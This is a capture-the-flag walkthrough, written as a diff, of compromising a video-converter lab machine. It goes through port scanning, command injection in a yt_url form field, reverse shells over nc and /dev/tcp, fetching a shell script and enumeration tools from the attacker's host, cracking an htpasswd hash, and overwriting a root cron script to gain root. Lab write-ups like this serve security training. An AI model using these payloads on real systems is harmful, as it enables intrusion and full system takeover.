@@ -1,0 +1,115 @@
+Convert My Video:
+
+1-Enumerate:
+    nmap -T5 -Pn -sC -sV <IP> -vv:
+
+        PORT   STATE SERVICE REASON         VERSION
+        22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) <------------ SSH
+        |   ssh-hostkey......
+
+
+        80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu)) <--------WEB Server
+
+            | http-methods:
+            |_  Supported Methods: GET HEAD POST OPTIONS
+            |_http-server-header: Apache/2.4.29 (Ubuntu)
+            |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+
+            MAC Address: 02:2E:40:BC:2A:91 (Unknown)
+            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+   
+
+    -gobuster dir -u http:// -r -w /usr/share/wordlists/dirb/common.txt | tee enum/gobuster-p80 log
+    -nikto -h <IP>
+
+ 
+
+Burp Suite:
+
+    -> REQUEST SENT : yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Daa
+
+    -> RECEIVE ERROR:
+        "status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID nc. URL https:\/\/www.youtube.com\/watch?v=nc
+
+
+    Test Form $variable: yt_url=`whoami`
+
+    
+    In response:
+
+        {YouTube\n","url_orginal":"`whoami`","output":"","result_url":"\/tmp\/downloads\/659c5f67a3606.mp3"}
+
+ 
+
+2-Exploit:
+    Exploit via Burp Suite to get a reverse Shell:
+
+    1st Test:
+
+        `rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.195.26%20443%20>/tmp/f` <--- Not Working
+
+    2nd Test:
+        Kali:   
+            python3 -m http.server 80
+
+        BurpSuite + Browser:
+            `curl${IFS}10.6.1.162:80/1LineShell.sh>/var/www/html/1LineShell.sh`
+        
+            `bash${IFS}/var/www/html/1LineShell.sh`
+
+
+    Get a TTY Shell:
+        python -c 'import pty;pty.spawn("/bin/bash");'
+
+    
+
+3-Linux Machine Enum:
+    www-data@dmv:/var/www/html$ wget http://<Kali IP>linenum.sh
+
+    linenum -  Result:
+        [-] htpasswd found - could contain passwords:
+
+            /var/www/html/admin/.htpasswd
+            itsmeadmin:$apr1$.....$UP1ylvgp4.zLKxWj8mc6y/
+        
+        Dehash:
+            echo $apr1$.....$UP1ylvgp4.zLKxWj8mc6y/ > des
+
+            hashcat -m 1600 des /usr/share/wordlists/rockyou.txt
+
+    ----------------------------------------------------------------------------------------        
+
+    CronJob we found:
+        root       779  0.0  0.3  30104  3168 ?        Ss   02:21   0:00 /usr/sbin/cron -f
+
+        We will get pspy 64 (https://github.com/DominicBreuker/pspy)
+        www-data@dmv:/var/www/html$ wget http://<Kali IP>/pspy64
+
+
+        We see a script executed by the CronJob:
+            2024/01/09 02:40:01 CMD: UID=0     PID=2026   | bash /var/www/html/tmp/clean.sh 
+            2024/01/09 02:40:01 CMD: UID=0     PID=2025   | bash /var/www/html/tmp/clean.sh <--------
+            2024/01/09 02:40:01 CMD: UID=0     PID=2024   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh                                                                                                                  
+            2024/01/09 02:40:01 CMD: UID=0     PID=2023   | /usr/sbin/CRON -f <------------
+
+4-Linux Machine Exploit
+
+    In Kali:
+        nc -lvp <PORT>
+
+    In Linux - CronFile Override:
+        www-data@dmv:/var/www/html/tmp$ chmod 777 clean.sh
+
+        We create a One lIne Reverse Shell:
+            bash -i >& /dev/tcp/<Kali IP>/<Port> 0>&1
+        
+            www-data@dmv:/var/www/html/tmp$ echo 'bash -i >& /dev/tcp/<Kali IP>/<Port> 0>&1' > clean.sh
+
+        Now We just wait the the CronJob execute clean.sh
+
+5- WE ARE ROOT !!!!!
+
+
+
+
+
